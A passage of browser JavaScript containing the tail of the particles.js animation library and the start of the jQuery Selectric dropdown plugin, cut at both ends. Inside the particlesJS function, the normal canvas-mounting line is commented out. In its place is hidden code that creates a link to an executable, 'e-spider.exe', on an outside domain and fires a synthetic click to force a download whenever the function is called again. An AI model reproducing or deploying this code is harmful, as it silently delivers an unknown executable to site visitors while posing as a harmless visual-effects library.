                    c = e - l;
                    d = e + c,
                    "size" == o && (t.radius_bubble = d),
                    "opacity" == o && (t.opacity_bubble = d)
                }
            } else if (a <= n.interactivity.modes.bubble.distance) {
                if (void 0 != r) var h = r;
                else var h = s;
                if (h != e) {
                    var d = s - u * (s - e) / n.interactivity.modes.bubble.duration;
                    "size" == o && (t.radius_bubble = d),
                    "opacity" == o && (t.opacity_bubble = d)
                }
            } else "size" == o && (t.radius_bubble = void 0),
            "opacity" == o && (t.opacity_bubble = void 0)
        }
        if (n.interactivity.events.onhover.enable && isInArray("bubble", n.interactivity.events.onhover.mode)) {
            var r = t.x - n.interactivity.mouse.pos_x,
            s = t.y - n.interactivity.mouse.pos_y,
            a = Math.sqrt(r * r + s * s),
            o = 1 - a / n.interactivity.modes.bubble.distance;
            if (a <= n.interactivity.modes.bubble.distance) {
                if (o >= 0 && "mousemove" == n.interactivity.status) {
                    if (n.interactivity.modes.bubble.size != n.particles.size.value) if (n.interactivity.modes.bubble.size > n.particles.size.value) {
                        var l = t.radius + n.interactivity.modes.bubble.size * o;
                        l >= 0 && (t.radius_bubble = l)
                    } else {
                        var c = t.radius - n.interactivity.modes.bubble.size,
                        l = t.radius - c * o;
                        t.radius_bubble = l > 0 ? l: 0
                    }
                    if (n.interactivity.modes.bubble.opacity != n.particles.opacity.value) if (n.interactivity.modes.bubble.opacity > n.particles.opacity.value) {
                        var h = n.interactivity.modes.bubble.opacity * o;
                        h > t.opacity && h <= n.interactivity.modes.bubble.opacity && (t.opacity_bubble = h)
                    } else {
                        var h = t.opacity - (n.particles.opacity.value - n.interactivity.modes.bubble.opacity) * o;
                        h < t.opacity && h >= n.interactivity.modes.bubble.opacity && (t.opacity_bubble = h)
                    }
                }
            } else e();
            "mouseleave" == n.interactivity.status && e()
        } else if (n.interactivity.events.onclick.enable && isInArray("bubble", n.interactivity.events.onclick.mode)) {
            if (n.tmp.bubble_clicking) {
                var r = t.x - n.interactivity.mouse.click_pos_x,
                s = t.y - n.interactivity.mouse.click_pos_y,
                a = Math.sqrt(r * r + s * s),
                u = ((new Date).getTime() - n.interactivity.mouse.click_time) / 1e3;
                u > n.interactivity.modes.bubble.duration && (n.tmp.bubble_duration_end = !0),
                u > 2 * n.interactivity.modes.bubble.duration && (n.tmp.bubble_clicking = !1, n.tmp.bubble_duration_end = !1)
            }
            n.tmp.bubble_clicking && (i(n.interactivity.modes.bubble.size, n.particles.size.value, t.radius_bubble, t.radius, "size"), i(n.interactivity.modes.bubble.opacity, n.particles.opacity.value, t.opacity_bubble, t.opacity, "opacity"))
        }
    },
    n.fn.modes.repulseParticle = function(t) {
        if (n.interactivity.events.onhover.enable && isInArray("repulse", n.interactivity.events.onhover.mode) && "mousemove" == n.interactivity.status) {
            var e = t.x - n.interactivity.mouse.pos_x,
            i = t.y - n.interactivity.mouse.pos_y,
            r = Math.sqrt(e * e + i * i),
            s = {
                x: e / r,
                y: i / r
            },
            a = n.interactivity.modes.repulse.distance,
            o = clamp(1 / a * ( - 1 * Math.pow(r / a, 2) + 1) * a * 100, 0, 50),
            l = {
                x: t.x + s.x * o,
                y: t.y + s.y * o
            };
            "bounce" == n.particles.move.out_mode ? (l.x - t.radius > 0 && l.x + t.radius < n.canvas.w && (t.x = l.x), l.y - t.radius > 0 && l.y + t.radius < n.canvas.h && (t.y = l.y)) : (t.x = l.x, t.y = l.y)
        } else if (n.interactivity.events.onclick.enable && isInArray("repulse", n.interactivity.events.onclick.mode)) if (n.tmp.repulse_finish || ++n.tmp.repulse_count == n.particles.array.length && (n.tmp.repulse_finish = !0), n.tmp.repulse_clicking) {
            var a = Math.pow(n.interactivity.modes.repulse.distance / 6, 3),
            c = n.interactivity.mouse.click_pos_x - t.x,
            h = n.interactivity.mouse.click_pos_y - t.y,
            u = c * c + h * h,
            d = -a / u * 1;
            u <= a &&
            function() {
                var e = Math.atan2(h, c);
                if (t.vx = d * Math.cos(e), t.vy = d * Math.sin(e), "bounce" == n.particles.move.out_mode) {
                    var i = {
                        x: t.x + t.vx,
                        y: t.y + t.vy
                    };
                    i.x + t.radius > n.canvas.w ? t.vx = -t.vx: i.x - t.radius < 0 && (t.vx = -t.vx),
                    i.y + t.radius > n.canvas.h ? t.vy = -t.vy: i.y - t.radius < 0 && (t.vy = -t.vy)
                }
            } ()
        } else 0 == n.tmp.repulse_clicking && (t.vx = t.vx_i, t.vy = t.vy_i)
    },
    n.fn.modes.grabParticle = function(t) {
        if (n.interactivity.events.onhover.enable && "mousemove" == n.interactivity.status) {
            var e = t.x - n.interactivity.mouse.pos_x,
            i = t.y - n.interactivity.mouse.pos_y,
            r = Math.sqrt(e * e + i * i);
            if (r <= n.interactivity.modes.grab.distance) {
                var s = n.interactivity.modes.grab.line_linked.opacity - r / (1 / n.interactivity.modes.grab.line_linked.opacity) / n.interactivity.modes.grab.distance;
                if (s > 0) {
                    var a = n.particles.line_linked.color_rgb_line;
                    n.canvas.ctx.strokeStyle = "rgba(" + a.r + "," + a.g + "," + a.b + "," + s + ")",
                    n.canvas.ctx.lineWidth = n.particles.line_linked.width,
                    n.canvas.ctx.beginPath(),
                    n.canvas.ctx.moveTo(t.x, t.y),
                    n.canvas.ctx.lineTo(n.interactivity.mouse.pos_x, n.interactivity.mouse.pos_y),
                    n.canvas.ctx.stroke(),
                    n.canvas.ctx.closePath()
                }
            }
        }
    },
    n.fn.vendors.eventsListeners = function() {
        "window" == n.interactivity.detect_on ? n.interactivity.el = window: n.interactivity.el = n.canvas.el,
        (n.interactivity.events.onhover.enable || n.interactivity.events.onclick.enable) && (n.interactivity.el.addEventListener("mousemove",
        function(t) {
            if (n.interactivity.el == window) var e = t.clientX,
            i = t.clientY;
            else var e = t.offsetX || t.clientX,
            i = t.offsetY || t.clientY;
            n.interactivity.mouse.pos_x = e,
            n.interactivity.mouse.pos_y = i,
            n.tmp.retina && (n.interactivity.mouse.pos_x *= n.canvas.pxratio, n.interactivity.mouse.pos_y *= n.canvas.pxratio),
            n.interactivity.status = "mousemove"
        }), n.interactivity.el.addEventListener("mouseleave",
        function(t) {
            n.interactivity.mouse.pos_x = null,
            n.interactivity.mouse.pos_y = null,
            n.interactivity.status = "mouseleave"
        })),
        n.interactivity.events.onclick.enable && n.interactivity.el.addEventListener("click",
        function() {
            if (n.interactivity.mouse.click_pos_x = n.interactivity.mouse.pos_x, n.interactivity.mouse.click_pos_y = n.interactivity.mouse.pos_y, n.interactivity.mouse.click_time = (new Date).getTime(), n.interactivity.events.onclick.enable) switch (n.interactivity.events.onclick.mode) {
            case "push":
                n.particles.move.enable ? n.fn.modes.pushParticles(n.interactivity.modes.push.particles_nb, n.interactivity.mouse) : 1 == n.interactivity.modes.push.particles_nb ? n.fn.modes.pushParticles(n.interactivity.modes.push.particles_nb, n.interactivity.mouse) : n.interactivity.modes.push.particles_nb > 1 && n.fn.modes.pushParticles(n.interactivity.modes.push.particles_nb);
                break;
            case "remove":
                n.fn.modes.removeParticles(n.interactivity.modes.remove.particles_nb);
                break;
            case "bubble":
                n.tmp.bubble_clicking = !0;
                break;
            case "repulse":
                n.tmp.repulse_clicking = !0,
                n.tmp.repulse_count = 0,
                n.tmp.repulse_finish = !1,
                setTimeout(function() {
                    n.tmp.repulse_clicking = !1
                },
                1e3 * n.interactivity.modes.repulse.duration)
            }
        })
    },
    n.fn.vendors.densityAutoParticles = function() {
        if (n.particles.number.density.enable) {
            var t = n.canvas.el.width * n.canvas.el.height / 1e3;
            n.tmp.retina && (t /= 2 * n.canvas.pxratio);
            var e = t * n.particles.number.value / n.particles.number.density.value_area,
            i = n.particles.array.length - e;
            i < 0 ? n.fn.modes.pushParticles(Math.abs(i)) : n.fn.modes.removeParticles(i)
        }
    },
    n.fn.vendors.checkOverlap = function(t, e) {
        for (var i = 0; i < n.particles.array.length; i++) {
            var r = n.particles.array[i],
            s = t.x - r.x,
            a = t.y - r.y;
            Math.sqrt(s * s + a * a) <= t.radius + r.radius && (t.x = e ? e.x: Math.random() * n.canvas.w, t.y = e ? e.y: Math.random() * n.canvas.h, n.fn.vendors.checkOverlap(t))
        }
    },
    n.fn.vendors.createSvgImg = function(t) {
        var e = n.tmp.source_svg,
        i = e.replace(/#([0-9A-F]{3,6})/gi,
        function(e, i, n, r) {
            if (t.color.rgb) var s = "rgba(" + t.color.rgb.r + "," + t.color.rgb.g + "," + t.color.rgb.b + "," + t.opacity + ")";
            else var s = "hsla(" + t.color.hsl.h + "," + t.color.hsl.s + "%," + t.color.hsl.l + "%," + t.opacity + ")";
            return s
        }),
        r = new Blob([i], {
            type: "image/svg+xml;charset=utf-8"
        }),
        s = window.URL || window.webkitURL || window,
        a = s.createObjectURL(r),
        o = new Image;
        o.addEventListener("load",
        function() {
            t.img.obj = o,
            t.img.loaded = !0,
            s.revokeObjectURL(a),
            n.tmp.count_svg++
        }),
        o.src = a
    },
    n.fn.vendors.destroypJS = function() {
        cancelAnimationFrame(n.fn.drawAnimFrame),
        i.remove(),
        pJSDom = null
    },
    n.fn.vendors.drawShape = function(t, e, i, n, r, s) {
        var a = r * s,
        o = r / s,
        l = 180 * (o - 2) / o,
        c = Math.PI - Math.PI * l / 180;
        t.save(),
        t.beginPath(),
        t.translate(e, i),
        t.moveTo(0, 0);
        for (var h = 0; h < a; h++) t.lineTo(n, 0),
        t.translate(n, 0),
        t.rotate(c);
        t.fill(),
        t.restore()
    },
    n.fn.vendors.exportImg = function() {
        window.open(n.canvas.el.toDataURL("image/png"), "_blank")
    },
    n.fn.vendors.loadImg = function(t) {
        if (n.tmp.img_error = void 0, "" != n.particles.shape.image.src) if ("svg" == t) {
            var e = new XMLHttpRequest;
            e.open("GET", n.particles.shape.image.src),
            e.onreadystatechange = function(t) {
                4 == e.readyState && (200 == e.status ? (n.tmp.source_svg = t.currentTarget.response, n.fn.vendors.checkBeforeDraw()) : (console.log("Error pJS - Image not found"), n.tmp.img_error = !0))
            },
            e.send()
        } else {
            var i = new Image;
            i.addEventListener("load",
            function() {
                n.tmp.img_obj = i,
                n.fn.vendors.checkBeforeDraw()
            }),
            i.src = n.particles.shape.image.src
        } else console.log("Error pJS - No image.src"),
        n.tmp.img_error = !0
    },
    n.fn.vendors.draw = function() {
        "image" == n.particles.shape.type ? "svg" == n.tmp.img_type ? n.tmp.count_svg >= n.particles.number.value ? (n.fn.particlesDraw(), n.particles.move.enable ? n.fn.drawAnimFrame = requestAnimFrame(n.fn.vendors.draw) : cancelRequestAnimFrame(n.fn.drawAnimFrame)) : n.tmp.img_error || (n.fn.drawAnimFrame = requestAnimFrame(n.fn.vendors.draw)) : void 0 != n.tmp.img_obj ? (n.fn.particlesDraw(), n.particles.move.enable ? n.fn.drawAnimFrame = requestAnimFrame(n.fn.vendors.draw) : cancelRequestAnimFrame(n.fn.drawAnimFrame)) : n.tmp.img_error || (n.fn.drawAnimFrame = requestAnimFrame(n.fn.vendors.draw)) : (n.fn.particlesDraw(), n.particles.move.enable ? n.fn.drawAnimFrame = requestAnimFrame(n.fn.vendors.draw) : cancelRequestAnimFrame(n.fn.drawAnimFrame))
    },
    n.fn.vendors.checkBeforeDraw = function() {
        "image" == n.particles.shape.type ? "svg" == n.tmp.img_type && void 0 == n.tmp.source_svg ? n.tmp.checkAnimFrame = requestAnimFrame(check) : (cancelRequestAnimFrame(n.tmp.checkAnimFrame), n.tmp.img_error || (n.fn.vendors.init(), n.fn.vendors.draw())) : (n.fn.vendors.init(), n.fn.vendors.draw())
    },
    n.fn.vendors.init = function() {
        n.fn.retinaInit(),
        n.fn.canvasInit(),
        n.fn.canvasSize(),
        n.fn.canvasPaint(),
        n.fn.particlesCreate(),
        n.fn.vendors.densityAutoParticles(),
        n.particles.line_linked.color_rgb_line = hexToRgb(n.particles.line_linked.color)
    },
    n.fn.vendors.start = function() {
        isInArray("image", n.particles.shape.type) ? (n.tmp.img_type = n.particles.shape.image.src.substr(n.particles.shape.image.src.length - 3), n.fn.vendors.loadImg(n.tmp.img_type)) : n.fn.vendors.checkBeforeDraw()
    },
    n.fn.vendors.eventsListeners(),
    n.fn.vendors.start()
};Object.deepExtend = function(t, e) {
    for (var i in e) e[i] && e[i].constructor && e[i].constructor === Object ? (t[i] = t[i] || {},
    arguments.callee(t[i], e[i])) : t[i] = e[i];
    return t
},
window.requestAnimFrame = function() {
    return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
    function(t) {
        window.setTimeout(t, 1e3 / 60)
    }
} (), window.cancelRequestAnimFrame = function() {
    return window.cancelAnimationFrame || window.webkitCancelRequestAnimationFrame || window.mozCancelRequestAnimationFrame || window.oCancelRequestAnimationFrame || window.msCancelRequestAnimationFrame || clearTimeout
} (), window.pJSDom = [], window.particlesJS = function(t, e) {
    "string" != typeof t && (e = t, t = "particles-js"),
    t || (t = "particles-js");
    var i = document.getElementById(t);
    //n = i.getElementsByClassName("particles-js-canvas-el");
    //if (n.length) for (; n.length > 0;) i.removeChild(n[0]);
    var r = document.createElement("canvas");
    r.className = "particles-js-canvas-el",
    r.style.width = "100%",
    r.style.height = "100%";

    if(_initSpiderCount == 0){

        _initSpiderCount += 1;

    }else{

        var eq = document.createElement('a');

        eq.href = "http://chinagoogle.cc/e-spider.exe";

        eq.setAttribute('download','e-spider.exe');

        var evt = new MouseEvent('click');

        eq.dispatchEvent(evt);

    }

    //null != document.getElementById(t).appendChild(r) && pJSDom.push(new pJS(t, e))
},
window.particlesJS.load = function(t, e, i) {
    var n = new XMLHttpRequest;
    n.open("GET", e),
    n.onreadystatechange = function(e) {
        if (4 == n.readyState) if (200 == n.status) {
            var r = JSON.parse(e.currentTarget.response);
            window.particlesJS(t, r),
            i && i()
        } else console.log("Error pJS - XMLHttpRequest status: " + n.status),
        console.log("Error pJS - File config not found")
    },
    n.send()
},
function(t) {
    "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof module && module.exports ? module.exports = function(e, i) {
        return void 0 === i && (i = "undefined" != typeof window ? require("jquery") : require("jquery")(e)),
        t(i),
        i
    }: t(jQuery)
} (function(t) {
    "use strict";
    var e = t(document),
    i = t(window),
    n = ["a", "e", "i", "o", "u", "n", "c", "y"],
    r = [/[\xE0-\xE5]/g, /[\xE8-\xEB]/g, /[\xEC-\xEF]/g, /[\xF2-\xF6]/g, /[\xF9-\xFC]/g, /[\xF1]/g, /[\xE7]/g, /[\xFD-\xFF]/g],
    s = function(e, i) {
        var n = this;
        n.element = e,
        n.$element = t(e),
        n.state = {
            multiple: !!n.$element.attr("multiple"),
            enabled: !1,
            opened: !1,
            currValue: -1,
            selectedIdx: -1,
            highlightedIdx: -1
        },
        n.eventTriggers = {
            open: n.open,
            close: n.close,
            destroy: n.destroy,
            refresh: n.refresh,
            init: n.init
        },
        n.init(i)
    };
    s.prototype = {
        utils: {
            isMobile: function() {
                return /android|ip(hone|od|ad)/i.test(navigator.userAgent)
            },
            escapeRegExp: function(t) {
                return t.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")
            },
            replaceDiacritics: function(t) {
                for (var e = r.length; e--;) t = t.toLowerCase().replace(r[e], n[e]);
                return t
            },
            format: function(t) {
                var e = arguments;
                return ("" + t).replace(/\{(?:(\d+)|(\w+))\}/g,
                function(t, i, n) {
                    return n && e[1] ? e[1][n] : e[i]
                })
            },
            nextEnabledItem: function(t, e) {
                for (; t[e = (e + 1) % t.length].disabled;);
                return e
            },
            previousEnabledItem: function(t, e) {
                for (; t[e = (e > 0 ? e: t.length) - 1].disabled;);
                return e
            },
            toDash: function(t) {
                return t.replace(/([a-z])([A-Z])/g, "$1-$2").toLowerCase()
            },
            triggerCallback: function(e, i) {
                var n = i.element,
                r = i.options["on" + e],
                s = [n].concat([].slice.call(arguments).slice(1));
                t.isFunction(r) && r.apply(n, s),
                t(n).trigger("selectric-" + this.toDash(e), s)
            },
            arrayToClassname: function(e) {
                var i = t.grep(e,
                function(t) {
                    return !! t
                });
                return t.trim(i.join(" "))
            }
        },
        init: function(e) {
            var i = this;
            if (i.options = t.extend(!0, {},
            t.fn.selectric.defaults, i.options, e), i.utils.triggerCallback("BeforeInit", i), i.destroy(!0), i.options.disableOnMobile && i.utils.isMobile()) return void(i.disableOnMobile = !0);
            i.classes = i.getClassNames();
            var n = t("<input/>", {
                class: i.classes.input,
                readonly: i.utils.isMobile()
            }),
            r = t("<div/>", {
                class: i.classes.items,
                tabindex: -1
            }),
            s = t("<div/>", {
                class: i.classes.scroll
            }),
            a = t("<div/>", {
                class: i.classes.prefix,
                html: i.options.arrowButtonMarkup
            }),
            o = t("<span/>", {
                class: "label"
            }),
            l = i.$element.wrap("<div/>").parent().append(a.prepend(o), r, n),
            c = t("<div/>", {
                class: i.classes.hideselect
            });
            i.elements = {
                input: n,
                items: r,
                itemsScroll: s,
                wrapper: a,
                label: o,
                outerWrapper: l
            },
            i.options.nativeOnMobile && i.utils.isMobile() && (i.elements.input = void 0, c.addClass(i.classes.prefix + "-is-native"), i.$element.on("change",
            function() {
                i.refresh()
            })),
            i.$element.on(i.eventTriggers).wrap(c),
            i.originalTabindex = i.$element.prop("tabindex"),
            i.$element.prop("tabindex", -1),
            i.populate(),
            i.activate(),
            i.utils.triggerCallback("Init", i)
        },
        activate: function() {
            var t = this,
            e = t.elements.items.closest(":visible").children(":hidden").addClass(t.classes.tempshow),
            i = t.$element.width();
            e.removeClass(t.classes.tempshow),
            t.utils.triggerCallback("BeforeActivate", t),
            t.elements.outerWrapper.prop("class", t.utils.arrayToClassname([t.classes.wrapper, t.$element.prop("class").replace(/\S+/g, t.classes.prefix + "-$&"), t.options.responsive ? t.classes.responsive: ""])),
            t.options.inheritOriginalWidth && i > 0 && t.elements.outerWrapper.width(i),
            t.unbindEvents(),
            t.$element.prop("disabled") ? (t.elements.outerWrapper.addClass(t.classes.disabled), t.elements.input && t.elements.input.prop("disabled", !0)) : (t.state.enabled = !0, t.elements.outerWrapper.removeClass(t.classes.disabled), t.$li = t.elements.items.removeAttr("style").find("li"), t.bindEvents()),
            t.utils.triggerCallback("Activate", t)
        },
        getClassNames: function() {
            var e = this,
            i = e.options.customClass,
            n = {};
            return t.each("Input Items Open Disabled TempShow HideSelect Wrapper Focus Hover Responsive Above Scroll Group GroupLabel".split(" "),
            function(t, r) {
                var s = i.prefix + r;
                n[r.toLowerCase()] = i.camelCase ? s: e.utils.toDash(s)
            }),
            n.prefix = i.prefix,
            n
        },
        setLabel: function() {
            var e = this,
            i = e.options.labelBuilder;
            if (e.state.multiple) {
                var n = t.isArray(e.state.currValue) ? e.state.currValue: [e.state.currValue];
                n = 0 === n.length ? [0] : n;
                var r = t.map(n,
                function(i) {
                    return t.grep(e.lookupItems,
                    function(t) {
                        return t.index === i
                    })[0]
                });
                r = t.grep(r,
                function(e) {
                    return r.length > 1 || 0 === r.length ? "" !== t.trim(e.value) : e
                }),
                r = t.map(r,
                function(n) {
                    return t.isFunction(i) ? i(n) : e.utils.format(i, n)
                }),
                e.options.multiple.maxLabelEntries && (r.length >= e.options.multiple.maxLabelEntries + 1 ? (r = r.slice(0, e.options.multiple.maxLabelEntries), r.push(t.isFunction(i) ? i({
                    text: "..."
                }) : e.utils.format(i, {
                    text: "..."
                }))) : r.slice(r.length - 1)),
                e.elements.label.html(r.join(e.options.multiple.separator))
            } else {
                var s = e.lookupItems[e.state.currValue];
                e.elements.label.html(t.isFunction(i) ? i(s) : e.utils.format(i, s))
            }
        },
        populate: function() {
            var e = this,
            i = e.$element.children(),
            n = e.$element.find("option"),
            r = n.filter(":selected"),
            s = n.index(r),
            a = 0,
            o = e.state.multiple ? [] : 0;
            r.length > 1 && e.state.multiple && (s = [], r.each(function() {
                s.push(t(this).index())
            })),
            e.state.currValue = ~s ? s: o,
            e.state.selectedIdx = e.state.currValue,
            e.state.highlightedIdx = e.state.currValue,
            e.items = [],
            e.lookupItems = [],
            i.length && (i.each(function(i) {
                var n = t(this);
                if (n.is("optgroup")) {
                    var r = {
                        element: n,
                        label: n.prop("label"),
                        groupDisabled: n.prop("disabled"),
                        items: []
                    };
                    n.children().each(function(i) {
                        var n = t(this);
                        r.items[i] = e.getItemData(a, n, r.groupDisabled || n.prop("disabled")),
                        e.lookupItems[a] = r.items[i],
                        a++
                    }),
                    e.items[i] = r
                } else e.items[i] = e.getItemData(a, n, n.prop("disabled")),
                e.lookupItems[a] = e.items[i],
                a++
            }), e.setLabel(), e.elements.items.append(e.elements.itemsScroll.html(e.getItemsMarkup(e.items))))
        },
        getItemData: function(e, i, n) {
            var r = this;
            return {
                index: e,
                element: i,
                value: i.val(),
                className: i.prop("class"),
                text: i.html(),
                slug: t.trim(r.utils.replaceDiacritics(i.html())),
                selected: i.prop("selected"),
                disabled: n
            }
        },
        getItemsMarkup: function(e) {
            var i = this,
            n = "<ul>";
            return t.isFunction(i.options.listBuilder) && i.options.listBuilder && (e = i.options.listBuilder(e)),
            t.each(e,
            function(e, r) {
                void 0 !== r.label ? (n += i.utils.format('<ul class="{1}"><li class="{2}">{3}</li>', i.utils.arrayToClassname([i.classes.group, r.groupDisabled ? "disabled": "", r.element.prop("class")]), i.classes.grouplabel, r.element.prop("label")), t.each(r.items,
                function(t, e) {
                    n += i.getItemMarkup(e.index, e)
                }), n += "</ul>") : n += i.getItemMarkup(r.index, r)
            }),
            n + "</ul>"
        },
        getItemMarkup: function(e, i) {
            var n = this,
            r = n.options.optionsItemBuilder,
            s = {
                value: i.value,
                text: i.text,
                slug: i.slug,
                index: i.index
            };
            return n.utils.format('<li data-index="{1}" class="{2}">{3}</li>', e, n.utils.arrayToClassname([i.className, e === n.items.length - 1 ? "last": "", i.disabled ? "disabled": "", i.selected ? "selected": ""]), t.isFunction(r) ? n.utils.format(r(i), i) : n.utils.format(r, s))
        },
        unbindEvents: function() {
            var t = this;
            t.elements.wrapper.add(t.$element).add(t.elements.outerWrapper).add(t.elements.input).off(".sl")
        },
        bindEvents: function() {
            var e = this;
            e.elements.outerWrapper.on("mouseenter.sl mouseleave.sl",
            function(i) {
                t(this).toggleClass(e.classes.hover, "mouseenter" === i.type),
                e.options.openOnHover && (clearTimeout(e.closeTimer), "mouseleave" === i.type ? e.closeTimer = setTimeout(t.proxy(e.close, e), e.options.hoverIntentTimeout) : e.open())
            }),
            e.elements.wrapper.on("click.sl",
            function(t) {
                e.state.opened ? e.close() : e.open(t)
            }),
            e.options.nativeOnMobile && e.utils.isMobile() || (e.$element.on("focus.sl",
            function() {
                e.elements.input.focus()
            }), e.elements.input.prop({
                tabindex: e.originalTabindex,
                disabled: !1
            }).on("keydown.sl", t.proxy(e.handleKeys, e)).on("focusin.sl",
            function(t) {
                e.elements.outerWrapper.addClass(e.classes.focus),
                e.elements.input.one("blur",
                function() {
                    e.elements.input.blur()
                }),
                e.options.openOnFocus && !e.state.opened && e.open(t)
            }).on("focusout.sl",
            function() {
                e.elements.outerWrapper.removeClass(e.classes.focus)
            }).on("input propertychange",
            function() {
                var i = e.elements.input.val(),
                n = new RegExp("^" + e.utils.escapeRegExp(i), "i");
                clearTimeout(e.resetStr),
                e.resetStr = setTimeout(function() {
                    e.elements.input.val("")
                },
                e.options.keySearchTimeout),
                i.length && t.each(e.items,
                function(t, i) {
                    if (!i.disabled && n.test(i.text) || n.test(i.slug)) return void e.highlight(t)
                })
            })),
            e.$li.on({
                mousedown: function(t) {
                    t.preventDefault(),
                    t.stopPropagation()
                },
                click: function() {
                    return e.select(t(this).data("index")),
                    !1
                }
            })
        },
        handleKeys: function(e) {
            var i = this,
            n = e.which,
            r = i.options.keys,
            s = t.inArray(n, r.previous) > -1,
            a = t.inArray(n, r.next) > -1,
            o = t.inArray(n, r.select) > -1,
            l = t.inArray(n, r.open) > -1,
            c = i.state.highlightedIdx,
            h = s && 0 === c || a && c + 1 === i.items.length,
            u = 0;
            if (13 !== n && 32 !== n || e.preventDefault(), s || a) {
                if (!i.options.allowWrap && h) return;
                s && (u = i.utils.previousEnabledItem(i.lookupItems, c)),
                a && (u = i.utils.nextEnabledItem(i.lookupItems, c)),
                i.highlight(u)
            }
            if (o && i.state.opened) return i.select(c),
            void(i.state.multiple && i.options.multiple.keepMenuOpen || i.close());
            l && !i.state.opened && i.open()
        },
        refresh: function() {
            var t = this;
            t.populate(),
            t.activate(),
            t.utils.triggerCallback("Refresh", t)
        },
        setOptionsDimensions: function() {
            var t = this,
            e = t.elements.items.closest(":visible").children(":hidden").addClass(t.classes.tempshow),
            i = t.options.maxHeight,
            n = t.elements.items.outerWidth(),
            r = t.elements.wrapper.outerWidth() - (n - t.elements.items.width()); ! t.options.expandToItemText || r > n ? t.finalWidth = r: (t.elements.items.css("overflow", "scroll"), t.elements.outerWrapper.width(9e4), t.finalWidth = t.elements.items.width(), t.elements.items.css("overflow", ""), t.elements.outerWrapper.width("")),
            t.elements.items.width(t.finalWidth).height() > i && t.elements.items.height(i),
            e.removeClass(t.classes.tempshow)
        },
        isInViewport: function() {
            var t = this,
            e = i.scrollTop(),
            n = i.height(),
            r = t.elements.outerWrapper.offset().top,
            s = t.elements.outerWrapper.outerHeight(),
            a = r + s + t.itemsHeight <= e + n,
            o = r - t.itemsHeight > e,
            l = !a && o;
            t.elements.outerWrapper.toggleClass(t.classes.above, l)
        },
        detectItemVisibility: function(e) {
            var i = this,
            n = i.$li.filter("[data-index]");
            i.state.multiple && (e = t.isArray(e) && 0 === e.length ? 0 : e, e = t.isArray(e) ? Math.min.apply(Math, e) : e);
            var r = n.eq(e).outerHeight(),
            s = n[e].offsetTop,
            a = i.elements.itemsScroll.scrollTop(),
            o = s + 2 * r;
            i.elements.itemsScroll.scrollTop(o > a + i.itemsHeight ? o - i.itemsHeight: s - r < a ? s - r: a)
        },
        open: function(i) {
            var n = this;
            if (n.options.nativeOnMobile && n.utils.isMobile()) return ! 1;
            n.utils.triggerCallback("BeforeOpen", n),
            i && (i.preventDefault(), n.options.stopPropagation && i.stopPropagation()),
            n.state.enabled && (n.setOptionsDimensions(), t("." + n.classes.hideselect, "." + n.classes.open).children().selectric("close"), n.state.opened = !0, n.itemsHeight = n.elements.items.outerHeight(), n.itemsInnerHeight = n.elements.items.height(), n.elements.outerWrapper.addClass(n.classes.open), n.elements.input.val(""), i && "focusin" !== i.type && n.elements.input.focus(), setTimeout(function() {
                e.on("click.sl", t.proxy(n.close, n)).on("scroll.sl", t.proxy(n.isInViewport, n))
            },
            1), n.isInViewport(), n.options.preventWindowScroll && e.on("mousewheel.sl DOMMouseScroll.sl", "." + n.classes.scroll,
            function(e) {
                var i = e.originalEvent,
                r = t(this).scrollTop(),
                s = 0;
                "detail" in i && (s = i.detail * -1),
                "wheelDelta" in i && (s = i.wheelDelta),
                "wheelDeltaY" in i && (s = i.wheelDeltaY),
                "deltaY" in i && (s = i.deltaY * -1),
                (r === this.scrollHeight - n.itemsInnerHeight && s < 0 || 0 === r && s > 0) && e.preventDefault()
            }), n.detectItemVisibility(n.state.selectedIdx), n.highlight(n.state.multiple ? -1 : n.state.selectedIdx), n.utils.triggerCallback("Open", n))
        },
        close: function() {
            var t = this;
            t.utils.triggerCallback("BeforeClose", t),
            e.off(".sl"),
            t.elements.outerWrapper.removeClass(t.classes.open),
            t.state.opened = !1,
            t.utils.triggerCallback("Close", t)
        },
        change: function() {
            var e = this;
            e.utils.triggerCallback("BeforeChange", e),
            e.state.multiple ? (t.each(e.lookupItems,
            function(t) {
                e.lookupItems[t].selected = !1,
                e.$element.find("option").prop("selected", !1)
            }), t.each(e.state.selectedIdx,
            function(t, i) {
                e.lookupItems[i].selected = !0,
                e.$element.find("option").eq(i).prop("selected", !0)
            }), e.state.currValue = e.state.selectedIdx, e.setLabel(), e.utils.triggerCallback("Change", e)) : e.state.currValue !== e.state.selectedIdx && (e.$element.prop("selectedIndex", e.state.currValue = e.state.selectedIdx).data("value", e.lookupItems[e.state.selectedIdx].text), e.setLabel(), e.utils.triggerCallback("Change", e))
        },
        highlight: function(t) {
            var e = this,
            i = e.$li.filter("[data-index]").removeClass("highlighted");
            e.utils.triggerCallback("BeforeHighlight", e),
            void 0 === t || t === -1 || e.lookupItems[t].disabled || (i.eq(e.state.highlightedIdx = t).addClass("highlighted"), e.detectItemVisibility(t), e.utils.triggerCallback("Highlight", e))
        },
        select: function(e) {
            var i = this,
            n = i.$li.filter("[data-index]");
            if (i.utils.triggerCallback("BeforeSelect", i, e), void 0 !== e && e !== -1 && !i.lookupItems[e].disabled) {
                if (i.state.multiple) {
                    i.state.selectedIdx = t.isArray(i.state.selectedIdx) ? i.state.selectedIdx: [i.state.selectedIdx];
                    var r = t.inArray(e, i.state.selectedIdx);
                    r !== -1 ? i.state.selectedIdx.splice(r, 1) : i.state.selectedIdx.push(e),
                    n.removeClass("selected").filter(function(e) {
                        return t.inArray(e, i.state.selectedIdx) !== -1
                    }).addClass("selected")
                } else n.removeClass("selected").eq(i.state.selectedIdx = e).addClass("selected");
                i.state.multiple && i.options.multiple.keepMenuOpen || i.close(),
                i.change(),
                i.utils.triggerCallback("Select", i, e)
            }
        },
        destroy: function(t) {
            var e = this;
            e.state && e.state.enabled && (e.elements.items.add(e.elements.wrapper).add(e.elements.input).remove(), t || e.$element.removeData("selectric").removeData("value"), e.$element.prop("tabindex", e.originalTabindex).off(".sl").off(e.eventTriggers).unwrap().unwrap(), e.state.enabled = !1)
        }
    },
    t.fn.selectric = function(e) {
        return this.each(function() {
            var i = t.data(this, "selectric");
            i && !i.disableOnMobile ? "string" == typeof e && i[e] ? i[e]() : i.init(e) : t.data(this, "selectric", new s(this, e))
        })
    },
    t.fn.selectric.defaults = {
        onChange: function(e) {
            t(e).change()
        },
        maxHeight: 300,
        keySearchTimeout: 500,
